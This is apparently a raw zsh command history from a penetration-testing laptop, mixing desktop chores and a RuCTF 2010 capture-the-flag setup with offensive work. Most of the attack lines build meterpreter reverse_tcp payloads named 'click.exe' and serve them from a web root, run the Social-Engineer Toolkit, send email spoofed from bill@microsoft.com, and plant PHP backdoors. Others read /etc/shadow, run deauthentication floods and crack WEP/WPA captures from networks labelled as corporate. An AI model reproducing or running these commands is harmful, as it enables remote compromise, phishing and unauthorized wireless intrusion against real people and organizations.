+xrandr --output VGA --mode 1024x600 --output LVDS --mode 1024x600
+krandr
+apt-cache search krandr
+apt-cache search grandr
+apt-get install grandr
+killall kooldock & xrandr --output VGA --mode 1024x768 --output LVDS --mode 1024x600
+xrandr --output VGA --on
+xrandr --output VGA --mode 800x600 --output LVDS --mode 1024x600
+xrandr --output VGA --off
+xrandr
+sudo vi /var/www/file.exe
+msfpayload windows/meterpreter/reverse_tcp LHOST=10.7.17.186 LPORT=4444 x > click.exe
+sudo rm GadBKYcv.jpeg
+vi HACKING
+ping plain-text.info 
+ping www.plain-text.info 
+upack t3mp/torrent/Windows\ XP\ Pro\ SP3\ Activated\ \[2010\]\ -\ www.GuruFuel.com.rar&rm t3mp/torrent/House.S07E16.720p.HDTV.X264-DIMENSION.mkv
+upack t3mp/torrent/Windows\ XP\ Pro\ SP3\ Activated\ \[2010\]\ -\ www.GuruFuel.com.rar
+upack t3mp/torrent/Windows.rar
+nmap -sS -O  172.16.27.1
+sudo nmap -sS -O  172.16.27.1
+sudo nmap -sS -O 192.168.26.1
+ifconfig 
+sudo nmap -sS -O 10.13.168.1
+ping 192.168.26.128
+sudo nmap -sS -O 192.168.26.128
+sudo cp /pentest/exploits/SET/msf.exe /var/www/click.exe
+sudo mv /pentest/exploits/SET/msf.exe /var/www/click.exe
+sudo /pentest/exploits/SET/set
+wavemon
+sendEmail -f bill@microsoft.com -t cheshir.box@gmail.com -m Hi -vv
+sendEmail -f bill@microsoft.com -t cheshir.box@gmail.com -m Hi -v
+sudo sendEmail -f bill@microsoft.com -t cheshir.box@gmail.com -m Hi -v
+./xp
+wavemon wlan0
+wavemon 
+sudo  wavemon 
+kfjdl
+man wavemon 
+ps 13197
+ps aux G 13197 
+whois 74.125.87.83
+ps aux G python
+wget icq.com
+cat ru.html
+cat ru.html G href=
+cat ru.html G href=|cut -f2 -d "/"
+cat ru.html G href=|cut -f1 -d "/"
+cat ru.html G href=|cut -f 3 -d "/"
+cat ru.html G href=|cut -f 3 -d "/" G icq.com
+cat ru.html G href=|cut -f 3 -d "/" G icq.com | sort -u
+cat ru.html G href=|cut -f 3 -d "/" G icq.com | sort -u|cut -d '"' -f 1
+cat ru.html G href=|cut -f 3 -d "/" G icq.com | sort -u|cut -d '"' -f 1|sort -u
+/pentest/enumeration/google/gooscan/gooscan
+gooscan -t www.google.com -q "linux"
+/pentest/enumeration/google/gooscan/
+./gooscan -t www.google.com -q "linux"
+msfpayload windows/meterpreter/reverse_tcp LPORT=10.7.17.193 LPORT=4444 x > click.exe
+msfpayload windows/meterpreter/reverse_tcp LHOST=10.7.17.193 LPORT=4444 x > click.exe
+sudo mv click.exe /var/www/click.exe
+vi hash
+msfpayload
+msfpayload windows/meterpeter/reverse_tcp LHOST=10.7.17.193 LPORT=4445 x > click.exe
+msfpayload windows/meterpreter/reverse_tcp LHOST=10.7.17.193 LPORT=4445 x > click.exe
+sudo cp click.exe /var/www
+sudo cp click.exe /var/www/click.exe
+vi dump
+/pentest/
+exploits
+SET
+sudo ./set
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d "." -f 1-3
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d "." -f 1,2,3
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d "." -f 1 - 3
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d "." -f 1 - 3 | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d "." -f1-3 | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f1-3 -d "." | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f 1-3 -d "." | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f 2 -d "." | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut 
+man cut
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f -3 -d "." | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f-3 -d "." | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f-3 -d '.' 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f-3 -d'.' 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f1,2,3 -d'.' 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f1-3 -d'.' 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -f1 -d'.' 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d" " -f1
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d'"' -f1 
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d'"' -f1 | sort -u
+grep href= ru.html | cut -f 3 -d "/" | grep icq.com | sort -u | cut -d'"' -f1 | sort -u > ip
+cat ip
+/pentest/enumeration/list-urls/list-urls.py icq.com
+vi /pentest/enumeration/list-urls/list-urls.py 
+mytp
+myip
+mkdir xp
+cd xp
+upack ~/t3mp/downloads/tables_xp_free_small.zip
+ifconfig eth0 up
+ps a
+man kill
+ps aux 
+ps aux | grep knotify
+ps aux | grep ssh
+ifconfig -a
+host ya.ru
+free
+cat /proc/meminfo
+upack t3mp/torrent/WorldOfGoo.tar.bz2
+cd WorldOfGoo
+chmod +x WorldOfGoo
+chmod 777 *
+./WorldOfGoo
+man zsh
+man zshzle
+git status
+cd /pentest/enumeration/
+WorldOfGoo/WorldOfGoo
+rm .zhistory.JsiTgC
+adhj
+cd /pentest/backdoors/web
+vi .zcompdump
+vi /pentest/passwords/lodowep/pw.txt
+x
+xxxxxxxxxxxxxxxxxxx
+a
+bjhjzkhczjkxchzxjkh
+
+l *chro*
+vi .DCOPserver_bt__0
+rm .D*
+rm .DCOPserver_bt__0 .DCOPserver_bt_:0
+ll .cache/google-chrome
+ll .cache/google-chrome/Default
+ll .cache/google-chrome/Default/Cache
+rm -rf .cache
+l .config
+vi .cvpcb
+rm .cvpcb
+l .debtags
+l .debtags/
+ll .debtags/
+rm -rf .debtags
+vi .directory
+vi .dragon/logs/exec_error.log
+vi .dragon/logs/exec.log
+vi .dragon/follow/Bluetooth.db
+rm .dump.swp
+vi .eeschema
+rm .eeschema
+vi .esd_auth
+rm .esd_auth
+vi .fehrc
+rm .feh*
+rm -rf .gajim
+mkdir ctf2010
+wget http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/key.txt
+wget http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/ructf-team-router.zip
+wget -c http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/ructf-team-router.zip && wget http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/ructf2010-vulnbox.7z
+apt-cache search flash
+apt-cache search swf
+klash
+apt-get install klash
+sudo killlall gnash
+sudo killall gnash
+rm -rf .config/google-chrome
+pgr conky
+sudo killall conky
+kill 12226
+kill -9 12226
+kill -9 12277
+vi .vim/backup/\~/vi\~2011-03-07\~
+rm .vim/backup/*
+rm -rf .vim/backup/*
+sudo rm -rf .vim/backup/*
+kill -9 12338
+kill conky
+kill -9 12741
+apt-cache search swfdec
+apt-get install swfdec
+apt-get install swfdec-gnome
+ffmpeg -i Offsec101\ Release/Offsec101\ -\ 1of3/Offsec101\ -\ 1of3.swf output.avi
+cd ctf2010
+wget -c http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/ructf-team-router.zip && wget -c http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/ructf2010-vulnbox.7z
+wget -c http://ftp.hackerdom.ru/ctf-images/2010-04-25-RuCTF2010/ructf2010-vulnbox.7z
+7z x ructf2010-vulnbox.7z
+swfdec-player
+apt-get remove swfdec-gnome && apt-get autoremove
+apt-get install ffmpeg
+apt-get install pyvnc2swf
+which pyvnc2swf
+pyversions 
+sudo find / -name *pyvnc*
+sudo find / -name pyvnc
+python pyvnc2swf.py
+sudo find / -name vnc2swf.py 
+python /usr/share/pyvnc2swf/edit.py -o ex.mpg Offsec101\ Release/TUTORIALS/Who\ is\ Leo\ leo-basic-usage.swf
+l .leo
+l .leo/scriptFile.py
+vi .leo/scriptFile.py
+vi .leo/workbook.leo
+vi .leo/db/workbook.leo_e90ef8ba86d3f106ee45a3668b9b7a8b/body_outline_ratio_fcache/3a45277190fda658f5c007752c67a201
+./ctf2010
+upack ructf2010-vulnbox.7z
+upack ructf-team-router.zip
+nc -v ya.ru 80
+nc -v ya.ru 25
+nc -v MAIL.GOOGLE.COM 25
+nc -v mail.google.com 25
+whichleo
+vi /usr/share/leo-4.8/leo/doc/coloring.txt
+which leo
+vi /usr/local/bin/leo
+rm -rf ~/.leo
+rm -rf ~/.leo/workbook.leo
+apt-get install pwgen
+ls /var/www/
+gftp
+nc 10.7.17.3
+nmap 10.7.17.3
+nc 10.7.17.3 1234
+nc 10.7.17.3 1234 > parse.pl
+vi parse.pl
+sudo cp /pentest/backdoors/web/php-backdoor.php /var/www/
+sudo cp /pentest/backdoors/web/simple-backdoor.php  /var/www/
+vi /var/www/php-backdoor.php
+rename s/.php// /var/www/php-backdoor.php
+sudo rename s/.php// /var/www/php-backdoor.php
+sudo cp /pentest/backdoors/web/php-backdoor.php /var/www/php-backdoor
+sudo cat /var/www/php-backdoor
+sudo cp /pentest/backdoors/web/php-backdoor.php /var/www/php-backdoor.html
+sudo cat /var/www/php-backdoor.html
+sudo chmod 777 /var/www/php-backdoor.html
+sudo chmod 000 /var/www/php-backdoor.html
+sudo l /var/www/php
+sudo l /var/www/
+l /var/www/
+sudo chmod 777 /var/www/php-backdoor
+sudo pack tgz /var/www/php-backdoor
+pack tgz /var/www/php-backdoor
+/etc/init.d/ssh start 
+sudo /etc/init.d/ssh start 
+mkdir temp
+sudo fdisk /dev/sdb1
+sudo mount /dev/sdb1 temp
+sudo mount -t vfat /dev/sdb1 temp
+sudo mount -t fat /dev/sdb1 temp
+sudo mount --force -t vfat /dev/sdb1 temp
+pack tgz pr0jects/ructf
+cp pr0jects/ructf.tar.gz /var/www/
+sudo cp pr0jects/ructf.tar.gz /var/www/
+/etc/init.d/ssh start
+sudo cp t3mp/downloads/Leo-4.8-final.zip /var/www/
+nmap 10.7.17.0
+nmap 10.7.17.
+nmap 10.7.17.1-200
+sudo nmap -O -sS 10.7.17.3
+ssh 10.7.17.3
+ssh 10.7.17.3 -u ructf
+ssh 10.7.17.3 -l ructf
+vi php-backdoor.php
+apt-cache search pea zip
+apt-cache search 7z
+apt-cache search arhiver
+man scrapy 
+scrapy shell ya.ru
+pip install scrapy
+pip-2.5 install scrapy
+sudo pip-2.5 install scrapy
+sudo pip-2.5 upgrade
+sudo pip-2.5 upgrade scrapy
+sudo pip-2.5 install upgrade 
+ttytter
+ls /dev/vid*
+sudo pip uninstall scrapy
+sudo pip install scrapy
+scrapy startproject test
+ls test
+ls test/spiders
+ping 46.146.193.18
+ping 95.84.140.37
+nmap google.com
+sudo nmap -O google.com
+sudo nmap -O 127.0.0.1
+nmap -sS google.com
+sudo nmap -sS google.com
+ping 109.74.70.187
+nmap http://www.sarahgillespie.co.uk
+host http://www.sarahgillespie.co.uk
+ping http://www.sarahgillespie.co.uk
+ping www.sarahgillespie.co.uk
+ping http://www.sarahjonessilver.co.uk/ 
+host www.sarahjonessilver.co.uk
+nmap 212.124.194.134
+nc 212.124.194.134 21
+nc 212.124.194.134 80
+upack t3mp/downloads/Ѓ�ерево.7z
+cd Ѓ�ерево
+vi -p ConsoleApplication8/Binary1.cs ConsoleApplication8/Binary.cs
+ping 10.7.17.195
+python -c "import sys;print sys.args" -1 -f
+python -c "import sys;print sys.args;" -1 -f
+vi sol-joy400.py
+python -c "import sys;print sys.argv;" -1 -f
+python -c "import sys;print sys.argv[1-];" -1 -f
+python -c "import sys;print sys.argv(1-);" -1 -f
+python -c "import sys;print sys.argv[1];" -1 -f
+python -c "import sys;print sys.argv[-1];" -1 -f
+python -c "import sys;print sys.argv[-1-];" -1 -f
+PLOG
+g++ hash.cpp 
+ghc hash.cpp 
+man ghc
+gcc hash.cpp
+vi hash.cpp
+sudo chmod 777 /var/www/simple-backdoor.php
+su root
+scrapy startproject scrapy
+rm -rf dmoz
+l spiders
+cat pipelines.py
+vi items.py
+vi -p items.py pipelines.py settings.py spiders/student_parser.py
+scrapy crawl scrapy --set FEED_URI=scraped_data.csv --set FEED_FORMAT=csv
+vi scrapy.cfg
+vi scrapy/items.py
+cd scrapy
+scrapy crawl student --set FEED_URI=scraped_data.csv --set FEED_FORMAT=csv
+vi pipelines.py
+vi settings.py
+vi spiders/student_parser.py
+rm -rf scrapy
+upack ~/t3mp/downloads/bekbulatov-scrapy-abitur-409424e.tar.gz
+rename s/.*/aditur/ bekbulatov-scrapy-abitur-409424e
+rename s/.+/abitur/ bekbulatov-scrapy-abitur-409424e
+cd abitur
+scrapy crawl abitur --set FEED_URI=scraped_data.csv --set FEED_FORMAT=csv
+apt-cache search csv
+vim ~/t3mp/downloads/csv-0.13.vba :so % :q
+vi scraped_data.csv
+wget http://narod.ru/disk/start/14.dl3b-narod.yandex.ru/8260629001/h5af1a56535a360c46a055b5750555167/kukushka_i_slon7x17.rar
+upack kukushka_i_slon7x17.rar
+mv kukushka_i_slon7x17.avi ~/
+upack /media/win/Users/chesh1r/Desktop/Fokin/CLIO_у�окин23.rar
+rename s/^\d\d\d // *.mp3
+rename s/\d\d\d // *.mp3
+rename s/\d\d\d // *
+rename s/[0-9] // *
+rename s/[0-9]{3} // *
+rename s/[0-9]{3}// *
+ping 10.7.17.10
+ping 10.7.17.177
+ping 10.7.17.5
+nmap 10.7.17.5
+sudo nmap -O 10.7.17.5
+ssh -O 10.7.17.5
+ll .ssh
+chmod 774 .ssh
+sudo chmod 774 .ssh
+ssh  10.7.17.5
+ssh  10.7.17.5 -l ructf
+upack t3mp/downloads/slow_http_test.tar.gz
+wget http://sokohack.sourceforge.net/slow_http_test.tar.gz
+upack slow_http_test.tar.gz
+rm slow_http_test.tar.gz
+./slow_http_test
+apt-get remove psi
+pgrep conky
+kill -9 7801
+conky &
+kill -9 7937
+cat /proc/sys/vm/laptop_mode
+echo 5 > /proc/sys/vm/laptop_mode
+sudo echo 5 > /proc/sys/vm/laptop_mode
+rm .kde3/Autostart/kooldock.desktop
+kill 7831
+cat /etc/passwd
+sudo tcpdump
+cd /pentest/exploits/SET/
+./set 
+sudo ./set 
+sudo cp /pentest/backdoors/web/php-backdoor.php ~/bd.html
+cat /etc/shadow
+sudo cat /etc/shadow
+sudo ifup eht0
+sudo rm /var/www-backdoor.php
+sudo vi /var/www/php-backdoor
+vi /var/www/simple-backdoor.php
+vi /var/www/get.php
+sudo vi /var/www/get.php
+sudo testdisk
+sudo shutdown -h 100
+kill -9 6113
+kill -9 7570
+conky&
+pppoecq
+apt-get update 
+/pentest/exploits/SET/set
+cd /pentest/exploits/SET
+./set
+python -c "import ullib"
+python -c "import urllib"
+vi ca
+vi ca.py
+vi .vim/backup/var
+vi /var/www/unicornscan/lib/pgsqldbclass.php
+adduser postgres
+su - postgres
+man passwd
+sudo su postgres
+ssh 10.7.17.10
+ssh 10.7.17.10 -l ructf
+pgadmin3&
+pgrep msf
+/var/www
+htdig
+htdig/
+unicornscan
+unicornscan/
+cd ~
+/etc/init.d/postgresql-8.3 start
+sudo /etc/init.d/postgresql-8.3 start
+pgadmin3
+sudo pgadmin3
+sudo /etc/init.d/postgresql-8.3 stop
+sudo mkdir /usr/local/pgsql/
+sudo mkdir /usr/local/pgsql/data; chown postgres /usr/local/pgsql/data
+sudo mkdir /usr/local/pgsql/data; sudo chown postgres /usr/local/pgsql/data
+sudo chown postgres /usr/local/pgsql/data
+which pgadmin3
+upack firefox-4.0.tar.bz2
+upack t3mp/downloads/fabrika_exploitov.rar
+rm t3mp/downloads/fabrika_exploitov.rar
+wget http://www.xakep.ru/post/52794/fabrika_exploitov.rar
+pr0jects/stypid.c
+vi pr0jects/newbe.c
+gcc pr0jects/newbe.c
+upack t3mp/downloads/top.rar
+sudo cp t3mp/downloads/top.rar /var/www
+sudo vi  /var/www/index.html
+ifconfig eth0 10.7.17.1
+sudo ifconfig eth0 10.7.17.1
+p0f -wlan0
+p0f -i wlan0
+upack fabrika_exploitov.rar
+rm fabrika_exploitov.rar
+tcpdump 'tcp[13] & 2 != 0'
+sudo tcpdump 'tcp[13] & 2 != 0'
+man tcpdump
+tcpdump -i wlan0 'tcp[13] & 2 != 0'
+sudo tcpdump -i wlan0 'tcp[13] & 2 != 0'
+nmap 10.7.15.146
+sudo nmap -O 10.7.15.146
+ping 10.7.15.146
+/pentest/enumeration/dns
+/usr/bin/koi8rxterm 
+sudo /usr/bin/koi8rxterm 
+update-alternatives  �-config x-terminal-emulator
+update-alternatives --config x-terminal-emulator
+sudo update-alternatives  �-config x-terminal-emulator
+sudo update-alternatives --config x-terminal-emulator
+/pentest/wireless/mdk3/mdk3
+sudo /pentest/wireless/mdk3/mdk3
+sudo /pentest/wireless/mdk3/mdk3 -i wlan0 d
+sudo /pentest/wireless/mdk3/mdk3 -i mon0 d
+sudo /pentest/wireless/mdk3/mdk3 -i phy0 d
+airodump-ng -w /home/s0v/t3mp/dump/first_corp-29.03
+airodump-ng mon0 -w /home/s0v/t3mp/dump/first_corp_wep-29.03 -t WEP
+airodump-ng mon0 -w /home/s0v/t3mp/dump/first_corp-29.03
+vi rule
+sudo airpwn
+./airdrop-ng/airdrop-ng -r ~/rule -i mon0
+sudo ./airdrop-ng/airdrop-ng -r ~/rule -i mon0
+sudo ./airdrop-ng/airdrop-ng.py -r ~/rule -i mon0
+sudo ./airdrop-ng/airdrop-ng
+sudo python2.5 ./airdrop-ng/airdrop-ng
+sudo python2.7 ./airdrop-ng/airdrop-ng
+aircrack-ng 
+aircrack-ng ~/t3mp/dump/first_corp-29.03-01.cap
+aircrack-ng ~/t3mp/dump/first_corp-29.03-02.cap
+aircrack-ng ~/t3mp/dump/*.cap
+sudo ./airdrop-ng/airdrop-ng.py -w ~/rule -i mon0
+./airdrop-ng/airdrop-ng.py -w ~/rule -i mon0
+./airdrop-ng/airdrop-ng -w ~/rule -i mon0
+vi ./airdrop-ng/airdrop-ng -w ~/rule
+./airdrop-ng/airdrop-ng -w ~/rule
+env python
+pip search libDumpParse
+sudo pip search libDumpParse
+vi ./airdrop-ng/airdrop-ng
+mdk3/mdk3
+rootmdk3/mdk3
+root mdk3/mdk3
+sudo  mdk3/mdk3
+sudo  mdk3/mdk3 d
+sudo  mdk3/mdk3 mon0 d
+aircrack-ng ~/t3mp/dump/first_corp-29.03-*.cap
+aircrack-ng ~/t3mp/dump/first_corp-*.cap
+vi /pentest/exploits/framework3/plugins
+ruby /pentest/exploits/framework3/plugins
+ruby /pentest/exploits/framework3/plugins/editor.rb
+aircrack-ng Kismet-*
+rm Kismet-*
+l /pentest/wireless/kmsapng
+/pentest/wireless/kmsapng/kmsapng.sh
+/pentest/wireless/kmsapng/kmsapng.sh -m km -i mon0
+sudo /pentest/wireless/kmsapng/kmsapng.sh -m km -i mon1
+airodump-ng mon0 -w t3mp/dump/second_corp-29.03
+aircrack-ng ~/t3mp/dump/*
+aircrack-ng ~/t3mp/dump/4flor*
+aircrack-ng ~/t3mp/dump/first*
+aircrack-ng ~/t3mp/dump/first*.cap
+aircrack-ng ~/t3mp/dump/first*.cap -w /pentest/passwords/wordlists/wpa.txt
+mcd wpa_rainbow_table
+mcd rair
+vi readme
+wget http://www.renderlab.net/projects/WPA-tables/SSID.zip http://www.renderlab.net/projects/WPA-tables/genrun.ziphttp://www.willhackforsushi.com/code/cowpatty/4.3/cowpatty-4.3.tgz http://www.renderlab.net/projects/WPA-tables/passwords2.zip 
+wget http://www.renderlab.net/projects/WPA-tables/
+ping 65.112.83.136
+wget http://www.renderlab.net/projects/WPA-tables/SSID.zip
+apt-cache search recover
+apt-cache search recover G recover
+apt-get install recover
+sudo /pentest/wireless/mdk3/mdk3 wlan0 
+/pentest/wireless/mdk3/mdk3 wlan0 
+/pentest/wireless/mdk3/mdk3 
+man /pentest/wireless/mdk3/mdk3 
+konqeror /pentest/wireless/mdk3/docs/
+<?xml version="1.0" encoding="utf-8"?>
+<?xml-stylesheet ekr_test?>
+<leo_file>
+<leo_header file_format="2"/>
+<vnodes>
+<v t="s0v.20110329163306.1265"><vh>newHeadline</vh></v>
+</vnodes>
+<tnodes>
+<t tx="s0v.20110329163306.1265"></t>
+</tnodes>
+</leo_file>
+aircrack-ng t3mp/dump/home*
+aircrack-ng t3mp/dump/home-01*
+aircrack-ng t3mp/dump/home-29*
+aircrack-ng t3mp/dump/home* -w /pentest/passwords/wordlists/wpa.txt
+aircrack-ng t3mp/dump/home*.cap -w /pentest/passwords/wordlists/wpa.txt
+aircrack-ng t3mp/dump/* -w /pentest/passwords/wordlists/wpa.txt
+aircrack-ng t3mp/dump/*.cap 
+aircrack-ng t3mp/dump/*.cap -w /pentest/passwords/wordlists/wpa.txt
+recover
+sudo recover
+apt-get remove recover
+man kismet
+which kismet
+whereis kismet
+vi /usr/etc/kismet.conf
+vi .kismet/kismet_ui.conf
+sudo  dpkg --clear-availe
+pgrep tomboy
+aircrack-ng t3mp/dump/*
+rm -rf .vim/ftdetect/
+rm .vim/ftplugin/csv.vim
+rm .vim/syntax/csv.vim
+/pentest/wireless/airgraph-ng/airgraph-ng.py
+sudo /pentest/wireless/airgraph-ng/airgraph-ng.py
+sudo pip install lib_Airgraphviz
+airoscript
+man airoscript
+sudo airoscript
+ifc
+airmon-ng stop mon1
+sudo airmon-ng stop mon1
+sudo airmon-ng stop mon2 mon3 mon4 
+sudo airmon-ng stop mon3 mon4 
+sudo airmon-ng stop mon4 
+ivstools 
+ivstools --megre t3mp/dump/*.cap t3mp/dump/*.pcapdump ivs.ivs
+ivstools --megre t3mp/dump/home-01.cap ivs.ivs
+ivstools --convent t3mp/dump/home-01.cap ivs.ivs
+upack t3mp/downloads/passwords2.zip
+vi passwords2.txt
+rm pa*
+screen 8814.pts-4.bt
+airmon-ng strt mon0
+,
+airodump-ng -w t3mp/dump/home-29.03
+airodump-ng -w t3mp/dump/home-29.03 mon0
+apt-cache search unetbootin
+apt-cache search usb creator
+apt-get install usb-creator
+usb-creator
+sudo apt-get install unetbootin
+apt-get remove usb-creator
+./WorldOfGoo/WorldOfGoo
+t3mp/downloads/unetbootin-linux-527
+sudo chmod +x t3mp/downloads/unetbootin-linux-527
+sudo t3mp/downloads/unetbootin-linux-527
+sudomount /media/flash /dev/sdb1
+sudo mount /media/flash /dev/sdb1
+sudo mount /dev/sdb1 /media/flash
+dmesg G db
+fdisk sdb
+fdisk /dev/sdb
+sudo fdisk /dev/sdb
+upack t3mp/torrent/Metasploitable.zip
+airodump-ng -w t3mp/dump/seven_corp_fourth-30.03 mon0
+sudo airodump-ng -w t3mp/dump/seven_corp_fourth-30.03 mon0
+cat .zhistory G md
+sudo /pentest/wireless/mdk3/mdk3 wlan0 d
+ping 87.253.24.43
+ping 87.253.24.45
+ping 10.7.17.193
+resolveip 10.7.17.193
+resolveip 192.168.0.1
+ifconfig eth0 192.168.0.2
+sudo ifconfig eth0 192.168.0.2
+macchanger --show
+macchanger --show wlan0
+macchanger -l wlan0
+macchanger -h
+giskismet -x t3mp/dump/*.netxml
+sudo airodump-ng-oui-update
+gem baffle 
+gem install baffle 
+sudo baffle 
+sudo gem install baffle 
+baffle 
+baffle -g
+baffle -i mon0
+airodump-ng -w t3mp/dump/home-30.03 mon0
+sudo airodump-ng -c 6 -b 00:01:23:45:67:89 -w t3mp/dump/home_(dlink)-30.03 mon0
+sudo airodump-ng -c 6 -b 00:01:23:45:67:89 -w /home/s0v/t3mp/dump/home-30.03 mon0
+sudo airodump-ng -w t3mp/dump/home-30.03 mon0
+python2.7
+pgrep power
+kpowersave&
+hping3
+sudo aireplay-ng -l 0 -a 00:01:23:45:67:89 mon0
+sudo aireplay-ng -1 0 -a 00:01:23:45:67:89 wlan0
+sudo aireplay-ng -1 0 -a 00:01:23:45:67:89 mon0
+aircrack-ng t3mp/dump/*.cap t3mp/dump/*.pcapdump
+aircrack-ng t3mp/dump/*.cap t3mp/dump/*.pcapdump -w /pentest/passwords/wordlists/wpa.txt
+air-counter
+man air-counter
+air-counter -h
+airopdate
+cat .zhistory G mdk
+sudo /pentest/wireless/mdk3/mdk3 mon0 d
+cat .zhistory G aire
+sudo aireplay-ng -1 1 -a 00:01:23:45:67:89 mon0
+aireplay-ng -1  -a 1C:BD:B9:2A:68:DC mon0
+aireplay-ng -3 -b 1C:BD:B9:2A:68:DC wlan0
+sudo aireplay-ng -3 -b 1C:BD:B9:2A:68:DC -h 00:1E:58:45:25:0E wlan0
+sudo aireplay-ng -3 -b 1C:BD:B9:2A:68:DC wlan0
+cat .zhistory G airpla
+cat .zhistory G air
+airodump-ng mono
+cat .zhistory G airep
+sudo aireplay-ng -1 0 -a 1C:BD:B9:2A:68:DC wlan0
+cat .zhistory G airod
+sudo airodump-ng -c 6 -b 00:01:23:45:67:89 -w /home/s0v/t3mp/dump/home_(dlink)-30.03 mon0
+sudo airodump-ng -c 6 -b 00:01:23:45:67:89 -w /home/s0v/t3mp/dump/seven_corp_fourth-30.03 mon0
+sudo airodump-ng -c  -b  -w /home/s0v/t3mp/dump/seven_corp_fourth-30.03 mon0
+sudo airodump-ng  -w /home/s0v/t3mp/dump/seven_corp_fourth-30.03 mon0
+sudo airodump-ng -c 10 -b 1C:BD:B9:2A:68:DC -w /home/s0v/t3mp/dump/seven_corp_fourth-30.03 mon0
+airodump-ng
+airodump-ng mom0
+aircrack-ng t3mp/dump/seven_corp_fourth-30.03-06.cap
+aircrack-ng t3mp/dump/*.cap G WPA
+aircrack-ng t3mp/dump/*.cap G WEP
+iwlist ath0 scan
+iwlist mon0 scan
+sudo iwlist mon0 scan
+sudo iwlist wlan0 scan
+sudo airodump-ng
+sudo airodump-ng wlan0
+vi win_t3mp/addr.txt
+knetworkmanager
+vi t3mp/dump/THE_WEP-01.kismet.netxml
+vi t3mp/dump/THE_WEP-01.cap
+vi /etc/resolv.conf
+nmap 192.168.0.101
+nmap -v -sN 192.168.0.0/16
+nmap -O 192.168.0.1
+nmap 192.168.0.1
+nmap -v 192.168.0.1
+nmap -v -p 80 192.168.0.1
+nc 192.168.0.1 80
+HEAD / HTTP/1.0
+nc -v 192.168.0.1 80
+fping -a -g 192.168.0.0/16
+airodump-ng -w wep -c (Channel) --bssid (BSSID) wlan0
+airodump-ng -c 1 -w wpa1 -b 00:19:CB:A3:2F:B4 wlan0
+sudo airodump-ng -c 1 -w wpa1 -b 00:19:CB:A3:2F:B4 wlan0
+sudo airodump-ng -c 1 -w wpa1 -b 00:19:CB:A3:2F:B4 mon0
+sudo airodump-ng -w t3mp/dump/home-31.03 mon0
+sudo airmon-ng stop wlan0mon
+sudo apt-get remove network-manager network-manager-gnome network-manager-kde-kde3
+airmon-ng mon0
+airodump-ng -w t3mp/dump/wep -c 6 --bssid 00:01:23:45:67:89 wlan0
+sudo airodump-ng -w t3mp/dump/wep -c 6 --bssid 00:01:23:45:67:89 wlan0
+airodump-ng -w t3mp/dump/wep -c 6 -b 00:01:23:45:67:89 mon0
+sudo airodump-ng -w t3mp/dump/wep -c 6 -b 00:01:23:45:67:89 mon0
+sudo airodump-ng -w t3mp/dump/wep -c 6 --bssid 00:01:23:45:67:89 mon0
+cat .zhistory G dump
+sudo airodump-ng -c 10 -b 1C:BD:B9:2A:68:DC -w /home/s0v/t3mp/dump/THE_WEP mon0
+sudo airodump-ng -c 6 -b 00:01:23:45:67:89 -w /home/s0v/t3mp/dump/THE_WEP mon0
+man airodump-ng
+sudo airodump-ng -i -t WEP -c 6 -b 00:01:23:45:67:89 -w /home/s0v/t3mp/dump/TEH_WEP mon0
+sudo airodump-ng -t WPA -c 1 -b  -w /home/s0v/t3mp/dump/TEH_WEP mon0
+sudo airodump-ng -t WPA -c 1 -b  -w /home/s0v/t3mp/dump/TEH_WPA mon0
+sudo airodump-ng -t WPA -c 1 -b 00:19:CB:A3:2F:B4 -w /home/s0v/t3mp/dump/TEH_WPA mon0
+C
+ll /pentest/passwords/wordlists
+apt-cache search dhcp
+apt-cache search dhcpcd
+apt-get install dhcpcd
+ps auxw G 8930|8934
+ps auxw G 8930 8934
+ps auxw G 8930
+ps auxw G 8934
+sudo kill -9 8934
+sudo kill -9 8930
+man aireplay-ng
+pgrep vmware
+kill 8037
+aircrack-ng -w /pentest/wireless/cowpatty/dict t3mp/dump/*.cap
+aircrack-ng -w /pentest/passwords/wordlists/wpa.txt t3mp/dump/*.cap
+aircrack-ng t3mp/dump/first_corp*.cap 
+aircrack-ng t3mp/dump/first_corp-29.03-01.cap
+aircrack-ng t3mp/dump/first_corp-29.03-02.cap
+aircrack-ng t3mp/dump/first_corp-29.03-03.cap
+rename s/first_corp-29.03-03/handshake/ t3mp/dump/first_corp-29.03-03.cap
+aircrack-ng t3mp/dump/handshake_uniyar.cap
+pyrit -e uniyar -f /pentest/passwords/wordlists/wpa.txt
+pyrit -e uniyar -f /pentest/passwords/wordlists/wpa.txt passthrough | cowpatty -d - -s uniyar t3mp/dump/*.cap
+cowpatty -d - -s uniyar t3mp/dump/*.cap
+cowpatty -d - -s uniyar -r t3mp/dump/*.cap
